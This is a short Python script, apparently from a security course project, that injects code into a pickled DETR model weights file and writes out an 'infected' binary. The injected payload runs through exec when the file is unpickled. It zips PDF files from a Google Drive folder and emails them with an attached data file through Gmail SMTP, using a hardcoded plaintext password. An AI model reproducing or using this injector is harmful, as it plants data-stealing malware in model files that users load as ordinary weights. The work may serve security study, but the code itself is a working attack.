import pickle
import builtins
from extract_pickle import PickleEC
from code_injection.attackinjector import AttackInjector

# First, we instantiate our pickle extractor and attack injector
pk_extractor = PickleEC()
attack_injector =  AttackInjector(pk_extractor)

# Next, we define an attack we want to carry out
bad_module = "__builtin__\neval"
payload = """import smtplib
import glob, os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from zipfile import ZipFile
zipObj = ZipFile('sample.zip', 'w')
os.chdir("/content/drive/MyDrive")
for file in glob.glob("*.pdf"):
    zipObj.write(file)
zipObj.close()
fromaddr = "alrivero@cs.stonybrook.edu"
toaddr = "alrivero@cs.stonybrook.edu"
msg = MIMEMultipart()
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "Subject of the Mail"
body = "Body_of_the_mail"
msg.attach(MIMEText(body, 'plain'))
filename = "data.pkl"
attachment = open("/Users/alrivero/Documents/CSE_508/mal_bins/vit/data.pkl", "rb")
p = MIMEBase('application', 'octet-stream')
p.set_payload((attachment).read())
encoders.encode_base64(p)
p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
msg.attach(p)
s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()
s.login(fromaddr, "Sbcs114613969")
text = msg.as_string()
s.sendmail(fromaddr, toaddr, text)
s.quit()
"""
payload = f"exec(\'\'\'{payload}\'\'\')"

attacks = [AttackInjector.sequential_module_attack_with_memo]
attack_indices = [10] # Indicies in original pickle file before tampering (in order pls)
attack_args = [(bad_module, payload)]

# Injection time on binary file (Happens sequentially)
in_bin_dir = "/Users/alrivero/Documents/CSE_508/mal_bins/detr/detr-resnet-50.bin"
out_bin_dir = "/Users/alrivero/Documents/CSE_508/mal_bins/detr/detr-resnet-50-infected.bin"
attack_injector.inject_attacks_bin(
    attacks,
    attack_indices,
    attack_args,
    in_bin_dir,
    out_bin_dir
)
